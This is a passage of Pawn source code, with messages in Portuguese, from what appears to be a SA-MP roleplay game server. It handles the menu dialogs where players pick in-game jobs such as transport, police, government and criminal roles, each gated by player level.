	                    ShowPlayerDialog(playerid, D_ISPAW, DIALOG_STYLE_MSGBOX, "{FF0000}{1E90FF} Spawn", "Caso opte por ser levado ao seu local de trabalho, selecione 'Sim'\nPara permanecer na agência, selecione 'Não'", "Sim", "Não");
	                    return 1;
					}
	            }
	      		case 2:
	            {
	                if(pInfo[playerid][Prof] == MOTO_TAXISTA)
				    {
						SendClientMessage(playerid, COR_ERRO, "Você já é um(a) Moto-Taxista!");
						PlayerPlaySound(playerid, 1054, 0.0, 0.0, 10.0);
						return 1;
					}
	                if(pInfo[playerid][Level] >= 25)
	                {
	                    SendClientMessage(playerid, COR_MOTOTAXI, "Parabéns, você agora é um(a) Moto-Taxista.");
	                    PlayerPlaySound(playerid, 1057, 0.0, 0.0, 10.0);
	                    pInfo[playerid][Prof] = MOTO_TAXISTA;
	                    SetPlayerColor(playerid, COR_MOTOTAXI);
	                    ShowPlayerDialog(playerid, D_ISPAW, DIALOG_STYLE_MSGBOX, "{FF0000}{1E90FF} Spawn", "Caso opte por ser levado ao seu local de trabalho, selecione 'Sim'\nPara permanecer na agência, selecione 'Não'", "Sim", "Não");
	                    return 1;
					}
					else
					{
					    SendClientMessage(playerid, COR_ERRO, "Você não tem nível o suficiente para esta profissão!");
					    SendClientMessage(playerid, COR_BRANCO, "Essa profissão requer no mínimo nível 25 ou superior.");
					    PlayerPlaySound(playerid, 1054, 0.0, 0.0, 10.0);
					    return 1;
					}
	            }
	            case 3:
	            {
	                ShowPlayerDialog(playerid, D_PROFS, DIALOG_STYLE_LIST, "Empregos", "{FFFF00}1- {F1C259}Serviços Particulares\n{FFFF00}2- {FFFFFF}Transportes Público\n{FFFF00}3- {FFFFFF}Transportes\n{FFFF00}{FFFF00}4- {4390C3}Segurança Pública\n{FFFF00}5- {FFBDD7}Servidores Públicos\n{FFFF00}6- {F1DD0F}Governamentais\n{FFFF00}7- {F41A00}Desonestos\n{FFFF00}8- {FFFFFF}Honestos", "Ver", "Sair");
	                return 1;
				}
			}
		}
	}
	if(dialogid == D_TRANP)
	{
        if(response)
        {
	        switch(listitem)
	        {
				case 0:
				{
	                if(pInfo[playerid][Prof] == CAMINHONEIRO)
				    {
						SendClientMessage(playerid, COR_ERRO, "Você já é um(a) Caminhoneiro(a)!");
						PlayerPlaySound(playerid, 1054, 0.0, 0.0, 10.0);
						return 1;
					}
	                if(pInfo[playerid][Level] >= 0)
	                {
	                    SendClientMessage(playerid, COR_CAMINHONEIRO, "Parabéns, você agora é um(a) Caminhoneiro(a).");
	                    PlayerPlaySound(playerid, 1057, 0.0, 0.0, 10.0);
	                    pInfo[playerid][Prof] = CAMINHONEIRO;
	                    SetPlayerColor(playerid, COR_CAMINHONEIRO);
	                    ShowPlayerDialog(playerid, D_ISPAW, DIALOG_STYLE_MSGBOX, "{FF0000}{1E90FF} Spawn", "Caso opte por ser levado ao seu local de trabalho, selecione 'Sim'\nPara permanecer na agência, selecione 'Não'", "Sim", "Não");
	                    return 1;
					}
	            }
	            case 1:
	   			{
	                if(pInfo[playerid][Prof] == MAQUINISTA)
				    {
						SendClientMessage(playerid, COR_ERRO, "Você já é um(a) Maquinista!");
						PlayerPlaySound(playerid, 1054, 0.0, 0.0, 10.0);
						return 1;
					}
	                if(pInfo[playerid][Level] >= 10)
	                {
	                    SendClientMessage(playerid, COR_MAQUINISTA, "Parabéns, você agora é um(a) Maquinista.");
	                    PlayerPlaySound(playerid, 1057, 0.0, 0.0, 10.0);
	                    pInfo[playerid][Prof] = MAQUINISTA;
	                    SetPlayerColor(playerid, COR_MAQUINISTA);
	                    ShowPlayerDialog(playerid, D_ISPAW, DIALOG_STYLE_MSGBOX, "{FF0000}{1E90FF} Spawn", "Caso opte por ser levado ao seu local de trabalho, selecione 'Sim'\nPara permanecer na agência, selecione 'Não'", "Sim", "Não");
	                    return 1;
					}
					else
					{
					    SendClientMessage(playerid, COR_ERRO, "Você não tem nível o suficiente para esta profissão!");
					    SendClientMessage(playerid, COR_BRANCO, "Essa profissão requer no mínimo nível 10 ou superior.");
					    PlayerPlaySound(playerid, 1054, 0.0, 0.0, 10.0);
					    return 1;
					}
	            }
	            case 2:
	          	{
	                if(pInfo[playerid][Prof] == TRANSPORTADOR)
				    {
						SendClientMessage(playerid, COR_ERRO, "Você já é um(a) Transportador(a)!");
						PlayerPlaySound(playerid, 1054, 0.0, 0.0, 10.0);
						TogglePlayerControllable(playerid, true);
						return 1;
					}
	                if(pInfo[playerid][Level] >= 0)
	                {
	                    SendClientMessage(playerid, COR_TRANSPORTADOR, "Parabéns, você agora é um(a) Transportador(a).");
	                    PlayerPlaySound(playerid, 1057, 0.0, 0.0, 10.0);
	                    pInfo[playerid][Prof] = TRANSPORTADOR;
	                    SetPlayerColor(playerid, COR_TRANSPORTADOR);
	                    ShowPlayerDialog(playerid, D_ISPAW, DIALOG_STYLE_MSGBOX, "{FF0000}{1E90FF} Spawn", "Caso opte por ser levado ao seu local de trabalho, selecione 'Sim'\nPara permanecer na agência, selecione 'Não'", "Sim", "Não");
	                    return 1;
					}
					/*else
					{
					    SendClientMessage(playerid, COR_ERRO, "Você não tem nível o suficiente para esta profissão!");
					    SendClientMessage(playerid, COR_BRANCO, "Essa profissão requer no mínimo nível 50 ou superior.");
					    PlayerPlaySound(playerid, 1054, 0.0, 0.0, 10.0);
					    return 1;
					}*/
	            }
 				case 3:
				{
	                if(pInfo[playerid][Prof] == PILOTO)
				    {
						SendClientMessage(playerid, COR_ERRO, "Você já é um(a) Piloto!");
						PlayerPlaySound(playerid, 1054, 0.0, 0.0, 10.0);
						return 1;
					}
	                if(pInfo[playerid][Level] >= 5)
	                {
	                    SendClientMessage(playerid, COR_CAMINHONEIRO, "Parabéns, você agora é um(a) Piloto.");
	                    PlayerPlaySound(playerid, 1057, 0.0, 0.0, 10.0);
	                    pInfo[playerid][Prof] = PILOTO;
	                    SetPlayerColor(playerid, COR_PILOTO);
	                    ShowPlayerDialog(playerid, D_ISPAW, DIALOG_STYLE_MSGBOX, "{FF0000}{1E90FF} Spawn", "Caso opte por ser levado ao seu local de trabalho, selecione 'Sim'\nPara permanecer na agência, selecione 'Não'", "Sim", "Não");
	                    return 1;
					}
					else
					{
					    SendClientMessage(playerid, COR_ERRO, "Você não tem nível o suficiente para esta profissão!");
					    SendClientMessage(playerid, COR_BRANCO, "Essa profissão requer no mínimo nível 5 ou superior.");
					    PlayerPlaySound(playerid, 1054, 0.0, 0.0, 10.0);
					    return 1;
					}
	            }
	            case 4:
	            {
	                ShowPlayerDialog(playerid, D_PROFS, DIALOG_STYLE_LIST, "Empregos", "{FFFF00}1- {F1C259}Serviços Particulares\n{FFFF00}2- {FFFFFF}Transportes Público\n{FFFF00}3- {FFFFFF}Transportes\n{FFFF00}{FFFF00}4- {4390C3}Segurança Pública\n{FFFF00}5- {FFBDD7}Servidores Públicos\n{FFFF00}6- {F1DD0F}Governamentais\n{FFFF00}7- {F41A00}Desonestos\n{FFFF00}8- {FFFFFF}Honestos", "Ver", "Sair");
	                return 1;
				}
			}
		}
	}
	if(dialogid == D_PARTI)
	{
        if(response)
        {
	        switch(listitem)
	        {
	            case 0:
				{
	               	if(pInfo[playerid][Prof] == SEGURANCA_PART)
				    {
						SendClientMessage(playerid, COR_ERRO, "Você já é um(a) Segurança Particular!");
						PlayerPlaySound(playerid, 1054, 0.0, 0.0, 10.0);
						return 1;
					}
	                if(pInfo[playerid][Level] >= 20)
	                {
	                    SendClientMessage(playerid, COR_SEGPART, "Parabéns, você agora é um(a) Segurança Particular.");
	                    PlayerPlaySound(playerid, 1057, 0.0, 0.0, 10.0);
	                    pInfo[playerid][Prof] = SEGURANCA_PART;
	                    SetPlayerColor(playerid, COR_SEGPART);
	                    ShowPlayerDialog(playerid, D_ISPAW, DIALOG_STYLE_MSGBOX, "{FF0000}{1E90FF} Spawn", "Caso opte por ser levado ao seu local de trabalho, selecione 'Sim'\nPara permanecer na agência, selecione 'Não'", "Sim", "Não");
	                    return 1;
					}
					else
					{
					    SendClientMessage(playerid, COR_ERRO, "Você não tem nível o suficiente para esta profissão!");
					    SendClientMessage(playerid, COR_BRANCO, "Essa profissão requer no mínimo nível 20 ou superior.");
					    PlayerPlaySound(playerid, 1054, 0.0, 0.0, 10.0);
					    return 1;
					}
				}
				case 1:
				{
					if(pInfo[playerid][Prof] == MOTORISTA_PART)
				    {
						SendClientMessage(playerid, COR_ERRO, "Você já é um(a) Motorista Particular!");
						PlayerPlaySound(playerid, 1054, 0.0, 0.0, 10.0);
						return 1;
					}
	                if(pInfo[playerid][Level] >= 20)
	                {
	                    SendClientMessage(playerid, COR_MOTPART, "Parabéns, você agora é um(a) Motorista Particular.");
	                    PlayerPlaySound(playerid, 1057, 0.0, 0.0, 10.0);
	                    pInfo[playerid][Prof] = MOTORISTA_PART;
	                    SetPlayerColor(playerid, COR_MOTPART);
	                    ShowPlayerDialog(playerid, D_ISPAW, DIALOG_STYLE_MSGBOX, "{FF0000}{1E90FF} Spawn", "Caso opte por ser levado ao seu local de trabalho, selecione 'Sim'\nPara permanecer na agência, selecione 'Não'", "Sim", "Não");
	                    return 1;
					}
					else
					{
					    SendClientMessage(playerid, COR_ERRO, "Você não tem nível o suficiente para esta profissão!");
					    SendClientMessage(playerid, COR_BRANCO, "Essa profissão requer no mínimo nível 20 ou superior.");
					    PlayerPlaySound(playerid, 1054, 0.0, 0.0, 10.0);
					    return 1;
					}
				}
	           	case 2:
	            {
	                if(pInfo[playerid][HabAAviao] == 0 || pInfo[playerid][HabAHeli] == 0)
	                {
	                    SendClientMessage(playerid, COR_ERRO, "Essa profissão exige habilitação aérea!");
						return 1;
					}
	                if(pInfo[playerid][Prof] == PILOTO_PART)
				    {
						SendClientMessage(playerid, COR_ERRO, "Você já é um(a) Piloto(a) Particular!");
						PlayerPlaySound(playerid, 1054, 0.0, 0.0, 10.0);
						return 1;
					}
	                if(pInfo[playerid][Level] >= 45)
	                {
	                    SendClientMessage(playerid, COR_PILOTOPAR, "Parabéns, você agora é um(a) Piloto(a) Particular.");
	                    PlayerPlaySound(playerid, 1057, 0.0, 0.0, 10.0);
	                    pInfo[playerid][Prof] = PILOTO_PART;
	                    SetPlayerColor(playerid, COR_PILOTOPAR);
	                    ShowPlayerDialog(playerid, D_ISPAW, DIALOG_STYLE_MSGBOX, "{FF0000}{1E90FF} Spawn", "Caso opte por ser levado ao seu local de trabalho, selecione 'Sim'\nPara permanecer na agência, selecione 'Não'", "Sim", "Não");
	                    return 1;
					}
					else
					{
					    SendClientMessage(playerid, COR_ERRO, "Você não tem nível o suficiente para esta profissão!");
					    SendClientMessage(playerid, COR_BRANCO, "Essa profissão requer no mínimo nível 45 ou superior.");
					    PlayerPlaySound(playerid, 1054, 0.0, 0.0, 10.0);
					    return 1;
					}
	            }
				case 3:
	            {
	                ShowPlayerDialog(playerid, D_PROFS, DIALOG_STYLE_LIST, "Empregos", "{FFFF00}1- {F1C259}Serviços Particulares\n{FFFF00}2- {FFFFFF}Transportes Público\n{FFFF00}3- {FFFFFF}Transportes\n{FFFF00}{FFFF00}4- {4390C3}Segurança Pública\n{FFFF00}5- {FFBDD7}Servidores Públicos\n{FFFF00}6- {F1DD0F}Governamentais\n{FFFF00}7- {F41A00}Desonestos\n{FFFF00}8- {FFFFFF}Honestos", "Ver", "Sair");
	                return 1;
				}
			}
		}
	}
	if(dialogid == D_POLIC)
	{
        if(response)
        {
	        switch(listitem)
	        {
	            case 0:
				{
				    if(IsNotCop[playerid] == 1)
				    {
				        SendClientMessage(playerid, COR_ERRO, "Você não pode ser um policial, contate os corregedores!");
				        return 1;
					}
					if(pInfo[playerid][Prof] == GUARDA_TRANSITO)
				    {
						SendClientMessage(playerid, COR_ERRO, "Você já é um(a) Guarda de Trânsito!");
						PlayerPlaySound(playerid, 1054, 0.0, 0.0, 10.0);
						return 1;
					}
	                if(pInfo[playerid][Level] >= 30)
	                {
	                    SendClientMessage(playerid, COR_GUARDTRANS, "Parabéns, você agora é um(a) Guarda de Trânsito.");
	                    PlayerPlaySound(playerid, 1057, 0.0, 0.0, 10.0);
	                    pInfo[playerid][Prof] = GUARDA_TRANSITO;
	                    SetPlayerColor(playerid, COR_GUARDTRANS);
	                    ShowPlayerDialog(playerid, D_ISPAW, DIALOG_STYLE_MSGBOX, "{FF0000}{1E90FF} Spawn", "Caso opte por ser levado ao seu local de trabalho, selecione 'Sim'\nPara permanecer na agência, selecione 'Não'", "Sim", "Não");
	                    return 1;
					}
					else
					{
					    SendClientMessage(playerid, COR_ERRO, "Você não tem nível o suficiente para esta profissão!");
					    SendClientMessage(playerid, COR_BRANCO, "Essa profissão requer no mínimo nível 30 ou superior.");
					    PlayerPlaySound(playerid, 1054, 0.0, 0.0, 10.0);
					    return 1;
					}
				}
				case 1:
				{
				    if(IsNotCop[playerid] == 1)
				    {
				        SendClientMessage(playerid, COR_ERRO, "Você não pode ser um policial, contate os corregedores!");
				        return 1;
					}
					if(pInfo[playerid][Prof] == POL_CIVIL)
				    {
						SendClientMessage(playerid, COR_ERRO, "Você já é um(a) Policial Civil!");
						PlayerPlaySound(playerid, 1054, 0.0, 0.0, 10.0);
						return 1;
					}
	                if(pInfo[playerid][Level] >= 80)
	                {
	                    SendClientMessage(playerid, COR_POLCIVIL, "Parabéns, você agora é um(a) Policial Civil.");
	                    PlayerPlaySound(playerid, 1057, 0.0, 0.0, 10.0);
	                    pInfo[playerid][Prof] = POL_CIVIL;
	                    SetPlayerColor(playerid, COR_POLCIVIL);
	                    ShowPlayerDialog(playerid, D_ISPAW, DIALOG_STYLE_MSGBOX, "{FF0000}{1E90FF} Spawn", "Caso opte por ser levado ao seu local de trabalho, selecione 'Sim'\nPara permanecer na agência, selecione 'Não'", "Sim", "Não");
	                    return 1;
					}
					else
					{
					    SendClientMessage(playerid, COR_ERRO, "Você não tem nível o suficiente para esta profissão!");
					    SendClientMessage(playerid, COR_BRANCO, "Essa profissão requer no mínimo nível 80 ou superior.");
					    PlayerPlaySound(playerid, 1054, 0.0, 0.0, 10.0);
					    return 1;
					}
				}
				case 2:
				{
				    if(IsNotCop[playerid] == 1)
				    {
				        SendClientMessage(playerid, COR_ERRO, "Você não pode ser um policial, contate os corregedores!");
				        return 1;
					}
					if(pInfo[playerid][Prof] == POL_MILITAR)
				    {
						SendClientMessage(playerid, COR_ERRO, "Você já é um(a) Policial Militar!");
						PlayerPlaySound(playerid, 1054, 0.0, 0.0, 10.0);
						return 1;
					}
	                if(pInfo[playerid][Level] >= 100)
	                {
	                    SendClientMessage(playerid, COR_POLMILITAR, "Parabéns, você agora é um(a) Policial Militar.");
	                    PlayerPlaySound(playerid, 1057, 0.0, 0.0, 10.0);
	                    pInfo[playerid][Prof] = POL_MILITAR;
	                    SetPlayerColor(playerid, COR_POLMILITAR);
	                    ShowPlayerDialog(playerid, D_ISPAW, DIALOG_STYLE_MSGBOX, "{FF0000}{1E90FF} Spawn", "Caso opte por ser levado ao seu local de trabalho, selecione 'Sim'\nPara permanecer na agência, selecione 'Não'", "Sim", "Não");
	                    return 1;
					}
					else
					{
					    SendClientMessage(playerid, COR_ERRO, "Você não tem nível o suficiente para esta profissão!");
					    SendClientMessage(playerid, COR_BRANCO, "Essa profissão requer no mínimo nível 100 ou superior.");
					    PlayerPlaySound(playerid, 1054, 0.0, 0.0, 10.0);
					    return 1;
					}
				}
				case 3:
				{
				    if(IsNotCop[playerid] == 1)
				    {
				        SendClientMessage(playerid, COR_ERRO, "Você não pode ser um policial, contate os corregedores!");
				        return 1;
					}
					if(pInfo[playerid][Prof] == POL_RODOVIARIO)
				    {
						SendClientMessage(playerid, COR_ERRO, "Você já é um(a) Policial Rodoviário(a)!");
						PlayerPlaySound(playerid, 1054, 0.0, 0.0, 10.0);
						return 1;
					}
	                if(pInfo[playerid][Level] >= 180)
	                {
	                    SendClientMessage(playerid, COR_POLRODOVIARIO, "Parabéns, você agora é um(a) Policial Rodoviário(a).");
	                    PlayerPlaySound(playerid, 1057, 0.0, 0.0, 10.0);
	                    pInfo[playerid][Prof] = POL_RODOVIARIO;
	                    SetPlayerColor(playerid, COR_POLRODOVIARIO);
	                    ShowPlayerDialog(playerid, D_ISPAW, DIALOG_STYLE_MSGBOX, "{FF0000}{1E90FF} Spawn", "Caso opte por ser levado ao seu local de trabalho, selecione 'Sim'\nPara permanecer na agência, selecione 'Não'", "Sim", "Não");
	                    return 1;
					}
					else
					{
					    SendClientMessage(playerid, COR_ERRO, "Você não tem nível o suficiente para esta profissão!");
					    SendClientMessage(playerid, COR_BRANCO, "Essa profissão requer no mínimo nível 180 ou superior.");
					    PlayerPlaySound(playerid, 1054, 0.0, 0.0, 10.0);
					    return 1;
					}
				}
				case 4:
				{
				    if(IsNotCop[playerid] == 1)
				    {
				        SendClientMessage(playerid, COR_ERRO, "Você não pode ser um policial, contate os corregedores!");
				        return 1;
					}
				    if(pInfo[playerid][Prof] == POL_FEDERAL)
				    {
						SendClientMessage(playerid, COR_ERRO, "Você já é um(a) Policial Federal!");
						PlayerPlaySound(playerid, 1054, 0.0, 0.0, 10.0);
						return 1;
					}
	                if(pInfo[playerid][Level] >= 250)
	                {
	                    SendClientMessage(playerid, COR_POLFEDERAL, "Parabéns, você agora é um(a) Policial Federal!");
	                    PlayerPlaySound(playerid, 1057, 0.0, 0.0, 10.0);
	                    pInfo[playerid][Prof] = POL_FEDERAL;
	                    SetPlayerColor(playerid, COR_POLFEDERAL);
	                    ShowPlayerDialog(playerid, D_ISPAW, DIALOG_STYLE_MSGBOX, "{FF0000}{1E90FF} Spawn", "Caso opte por ser levado ao seu local de trabalho, selecione 'Sim'\nPara permanecer na agência, selecione 'Não'", "Sim", "Não");
	                    return 1;
					}
					else
					{
					    SendClientMessage(playerid, COR_ERRO, "Você não tem nível o suficiente para esta profissão!");
					    SendClientMessage(playerid, COR_BRANCO, "Essa profissão requer no mínimo nível 250 ou superior.");
					    PlayerPlaySound(playerid, 1054, 0.0, 0.0, 10.0);
					    return 1;
					}
				}
				case 5:
	            {
	                ShowPlayerDialog(playerid, D_PROFS, DIALOG_STYLE_LIST, "Empregos", "{FFFF00}1- {F1C259}Serviços Particulares\n{FFFF00}2- {FFFFFF}Transportes Público\n{FFFF00}3- {FFFFFF}Transportes\n{FFFF00}{FFFF00}4- {4390C3}Segurança Pública\n{FFFF00}5- {FFBDD7}Servidores Públicos\n{FFFF00}6- {F1DD0F}Governamentais\n{FFFF00}7- {F41A00}Desonestos\n{FFFF00}8- {FFFFFF}Honestos", "Ver", "Sair");
	                return 1;
				}
			}
		}
	}
	if(dialogid == D_GOVER)
	{
        if(response)
        {
	        switch(listitem)
	        {
	            case 0:
				{
					if(pInfo[playerid][Prof] == DEPUTADO)
				    {
						SendClientMessage(playerid, COR_ERRO, "Você já é um(a) Deputado(a)!");
						PlayerPlaySound(playerid, 1054, 0.0, 0.0, 10.0);
						return 1;
					}
	                if(pInfo[playerid][Level] >= 350)
	                {
	                    SendClientMessage(playerid, COR_DEPUTADO, "Parabéns, você agora é um(a) Deputado(a).");
	                    PlayerPlaySound(playerid, 1057, 0.0, 0.0, 10.0);
	                    pInfo[playerid][Prof] = DEPUTADO;
	                    SetPlayerColor(playerid, COR_DEPUTADO);
	                    ShowPlayerDialog(playerid, D_ISPAW, DIALOG_STYLE_MSGBOX, "{FF0000}{1E90FF} Spawn", "Caso opte por ser levado ao seu local de trabalho, selecione 'Sim'\nPara permanecer na agência, selecione 'Não'", "Sim", "Não");
	                    return 1;
					}
					else
					{
					    SendClientMessage(playerid, COR_ERRO, "Você não tem nível o suficiente para esta profissão!");
					    SendClientMessage(playerid, COR_BRANCO, "Essa profissão requer no mínimo nível 350 ou superior.");
					    PlayerPlaySound(playerid, 1054, 0.0, 0.0, 10.0);
					    return 1;
					}
				}
	 			case 1:
				{
					if(pInfo[playerid][Prof] == PREFEITO)
				    {
						SendClientMessage(playerid, COR_ERRO, "Você já é um(a) Prefeito(a)!");
						PlayerPlaySound(playerid, 1054, 0.0, 0.0, 10.0);
						return 1;
					}
	                if(pInfo[playerid][Level] >= 500)
	                {
	                    SendClientMessage(playerid, COR_PREFEITO, "Parabéns, você agora é um(a) Prefeito(a).");
	                    PlayerPlaySound(playerid, 1057, 0.0, 0.0, 10.0);
	                    pInfo[playerid][Prof] = PREFEITO;
	                    SetPlayerColor(playerid, COR_PREFEITO);
	                    ShowPlayerDialog(playerid, D_ISPAW, DIALOG_STYLE_MSGBOX, "{FF0000}{1E90FF} Spawn", "Caso opte por ser levado ao seu local de trabalho, selecione 'Sim'\nPara permanecer na agência, selecione 'Não'", "Sim", "Não");
	                    return 1;
					}
					else
					{
					    SendClientMessage(playerid, COR_ERRO, "Você não tem nível o suficiente para esta profissão!");
					    SendClientMessage(playerid, COR_BRANCO, "Essa profissão requer no mínimo nível 500 ou superior.");
					    PlayerPlaySound(playerid, 1054, 0.0, 0.0, 10.0);
					    return 1;
					}
				}
				case 2:
				{
					if(pInfo[playerid][Prof] == GOVERNADOR)
				    {
						SendClientMessage(playerid, COR_ERRO, "Você já é um(a) Governador!");
						PlayerPlaySound(playerid, 1054, 0.0, 0.0, 10.0);
						return 1;
					}
	                if(pInfo[playerid][Level] >= 1350)
	                {
	                    SendClientMessage(playerid, COR_GOVERNADOR, "Parabéns, você agora é um(a) Governador.");
	                    PlayerPlaySound(playerid, 1057, 0.0, 0.0, 10.0);
	                    pInfo[playerid][Prof] = GOVERNADOR;
	                    SetPlayerColor(playerid, COR_GOVERNADOR);
	                    ShowPlayerDialog(playerid, D_ISPAW, DIALOG_STYLE_MSGBOX, "{FF0000}{1E90FF} Spawn", "Caso opte por ser levado ao seu local de trabalho, selecione 'Sim'\nPara permanecer na agência, selecione 'Não'", "Sim", "Não");
	                    return 1;
					}
					else
					{
					    SendClientMessage(playerid, COR_ERRO, "Você não tem nível o suficiente para esta profissão!");
					    SendClientMessage(playerid, COR_BRANCO, "Essa profissão requer no mínimo nível 1350 ou superior.");
					    PlayerPlaySound(playerid, 1054, 0.0, 0.0, 10.0);
					    return 1;
					}
				}
				case 3:
	            {
	                ShowPlayerDialog(playerid, D_PROFS, DIALOG_STYLE_LIST, "Empregos", "{FFFF00}1- {F1C259}Serviços Particulares\n{FFFF00}2- {FFFFFF}Transportes Público\n{FFFF00}3- {FFFFFF}Transportes\n{FFFF00}{FFFF00}4- {4390C3}Segurança Pública\n{FFFF00}5- {FFBDD7}Servidores Públicos\n{FFFF00}6- {F1DD0F}Governamentais\n{FFFF00}7- {F41A00}Desonestos\n{FFFF00}8- {FFFFFF}Honestos", "Ver", "Sair");
	                return 1;
				}
			}
		}
	}
	if(dialogid == D_CRIME)
	{
        if(response)
        {
	        switch(listitem)
	        {
	            case 0:
				{
					if(pInfo[playerid][Prof] == TRAF_DROGAS)
				    {
						SendClientMessage(playerid, COR_ERRO, "Você já é um(a) Traficante de Drogas!");
						PlayerPlaySound(playerid, 1054, 0.0, 0.0, 10.0);
						return 1;
					}
	                if(pInfo[playerid][Level] >= 15)
	                {
	                    SendClientMessage(playerid, COR_TRAFDROGAS, "Parabéns, você agora é um(a) Traficante de Drogas.");
	                    PlayerPlaySound(playerid, 1057, 0.0, 0.0, 10.0);
	                    pInfo[playerid][Prof] = TRAF_DROGAS;
	                    SetPlayerColor(playerid, COR_TRAFDROGAS);
	                    ShowPlayerDialog(playerid, D_ISPAW, DIALOG_STYLE_MSGBOX, "{FF0000}{1E90FF} Spawn", "Caso opte por ser levado ao seu local de trabalho, selecione 'Sim'\nPara permanecer na agência, selecione 'Não'", "Sim", "Não");
	                    return 1;
					}
					else
					{
					    SendClientMessage(playerid, COR_ERRO, "Você não tem nível o suficiente para esta profissão!");
					    SendClientMessage(playerid, COR_BRANCO, "Essa profissão requer no mínimo nível 15 ou superior.");
					    PlayerPlaySound(playerid, 1054, 0.0, 0.0, 10.0);
					    return 1;
					}
				}
				case 1:
				{
					if(pInfo[playerid][Prof] == TRAF_ARMAS)
				    {
						SendClientMessage(playerid, COR_ERRO, "Você já é um(a) Traficante de Armas!");
						PlayerPlaySound(playerid, 1054, 0.0, 0.0, 10.0);
						return 1;
					}
	                if(pInfo[playerid][Level] >= 70)
	                {
	                    SendClientMessage(playerid, COR_TRAFARMAS, "Parabéns, você agora é um(a) Traficante de Armas.");
	                    PlayerPlaySound(playerid, 1057, 0.0, 0.0, 10.0);
	                    pInfo[playerid][Prof] = TRAF_ARMAS;
	                    SetPlayerColor(playerid, COR_TRAFARMAS);
	                    ShowPlayerDialog(playerid, D_ISPAW, DIALOG_STYLE_MSGBOX, "{FF0000}{1E90FF} Spawn", "Caso opte por ser levado ao seu local de trabalho, selecione 'Sim'\nPara permanecer na agência, selecione 'Não'", "Sim", "Não");
	                    return 1;
					}
					else
					{
					    SendClientMessage(playerid, COR_ERRO, "Você não tem nível o suficiente para esta profissão!");
					    SendClientMessage(playerid, COR_BRANCO, "Essa profissão requer no mínimo nível 70 ou superior.");
					    PlayerPlaySound(playerid, 1054, 0.0, 0.0, 10.0);
					    return 1;
					}
				}
	 			case 2:
				{
					if(pInfo[playerid][Prof] == HITMAN)
				    {
						SendClientMessage(playerid, COR_ERRO, "Você já é um(a) Hitman(a)!");
						PlayerPlaySound(playerid, 1054, 0.0, 0.0, 10.0);
						return 1;
					}
	                if(pInfo[playerid][Level] >= 300)
	                {
	                    SendClientMessage(playerid, COR_HITMAN, "Parabéns, você agora é um(a) Hitman(a).");
	                    PlayerPlaySound(playerid, 1057, 0.0, 0.0, 10.0);
	                    pInfo[playerid][Prof] = HITMAN;
	                    SetPlayerColor(playerid, COR_HITMAN);
                    	SetPlayerSkin(playerid, 127);
		                format(gFile, sizeof(gFile), "Contas/%s.ini", PlayerName(playerid));
		                WE_SetInt(gFile, "Skin", 127);
	                    ShowPlayerDialog(playerid, D_ISPAW, DIALOG_STYLE_MSGBOX, "{FF0000}{1E90FF} Spawn", "Caso opte por ser levado ao seu local de trabalho, selecione 'Sim'\nPara permanecer na agência, selecione 'Não'", "Sim", "Não");
	                    return 1;
					}
					else
					{
					    SendClientMessage(playerid, COR_ERRO, "Você não tem nível o suficiente para esta profissão!");
					    SendClientMessage(playerid, COR_BRANCO, "Essa profissão requer no mínimo nível 300 ou superior.");
					    PlayerPlaySound(playerid, 1054, 0.0, 0.0, 10.0);
					    return 1;
					}
				}
	 			case 3:
				{
					if(pInfo[playerid][Prof] == ATIRADOR)
				    {
						SendClientMessage(playerid, COR_ERRO, "Você já é um(a) Franco-Atirador(a)!");
						PlayerPlaySound(playerid, 1054, 0.0, 0.0, 10.0);
						return 1;
					}
	                if(pInfo[playerid][Level] >= 120)
	                {
	                    SendClientMessage(playerid, 0xFFFFFF, "Parabéns, você agora é um(a) Franco-Atirador(a).");
	                    PlayerPlaySound(playerid, 1057, 0.0, 0.0, 10.0);
	                    pInfo[playerid][Prof] = ATIRADOR;
	                    SetPlayerColor(playerid, COR_ATIRADOR);
	                    ShowPlayerDialog(playerid, D_ISPAW, DIALOG_STYLE_MSGBOX, "{FF0000}{1E90FF} Spawn", "Caso opte por ser levado ao seu local de trabalho, selecione 'Sim'\nPara permanecer na agência, selecione 'Não'", "Sim", "Não");
	                    return 1;
					}
					else
					{
					    SendClientMessage(playerid, COR_ERRO, "Você não tem nível o suficiente para esta profissão!");
					    SendClientMessage(playerid, COR_BRANCO, "Essa profissão requer no mínimo nível 120 ou superior.");
					    PlayerPlaySound(playerid, 1054, 0.0, 0.0, 10.0);
					    return 1;
					}
				}
	 			case 4:
				{
					if(pInfo[playerid][Prof] == TERRORISTA)
				    {
						SendClientMessage(playerid, COR_ERRO, "Você já é um(a) Terrorista!");
						PlayerPlaySound(playerid, 1054, 0.0, 0.0, 10.0);
						return 1;
					}
	                if(pInfo[playerid][Level] >= 160)
	                {
	                    SendClientMessage(playerid, COR_TERRORISTA, "Parabéns, você agora é um(a) Terrorista.");
	                    PlayerPlaySound(playerid, 1057, 0.0, 0.0, 10.0);
	                    pInfo[playerid][Prof] = TERRORISTA;
	                    SetPlayerColor(playerid, COR_TERRORISTA);
	                    ShowPlayerDialog(playerid, D_ISPAW, DIALOG_STYLE_MSGBOX, "{FF0000}{1E90FF} Spawn", "Caso opte por ser levado ao seu local de trabalho, selecione 'Sim'\nPara permanecer na agência, selecione 'Não'", "Sim", "Não");
	                    return 1;
					}
					else
					{
					    SendClientMessage(playerid, COR_ERRO, "Você não tem nível o suficiente para esta profissão!");
					    SendClientMessage(playerid, COR_BRANCO, "Essa profissão requer no mínimo nível 160 ou superior.");
					    PlayerPlaySound(playerid, 1054, 0.0, 0.0, 10.0);
					    return 1;
					}
				}
	 			case 5:
				{
					if(pInfo[playerid][Prof] == CHEFE_MAFIA)
				    {
						SendClientMessage(playerid, COR_ERRO, "Você já é Mafioso!");
						PlayerPlaySound(playerid, 1054, 0.0, 0.0, 10.0);
						return 1;
					}
	                if(pInfo[playerid][Level] >= 350)
	                {
	                    SendClientMessage(playerid, COR_CHEFEMAFIA, "Parabéns, você agora é o mafioso!");
	                    PlayerPlaySound(playerid, 1057, 0.0, 0.0, 10.0);
	                    pInfo[playerid][Prof] = CHEFE_MAFIA;
	                    ShowPlayerDialog(playerid, D_ISPAW, DIALOG_STYLE_MSGBOX, "{FF0000}{1E90FF} Spawn", "Caso opte por ser levado ao seu local de trabalho, selecione 'Sim'\nPara permanecer na agência, selecione 'Não'", "Sim", "Não");
	                    return 1;
					}
					else
					{
					    SendClientMessage(playerid, COR_ERRO, "Você não tem nível o suficiente para esta profissão!");
					    SendClientMessage(playerid, COR_BRANCO, "Essa profissão requer no mínimo nível 350 ou superior.");
					    PlayerPlaySound(playerid, 1054, 0.0, 0.0, 10.0);
					    return 1;
					}
				}
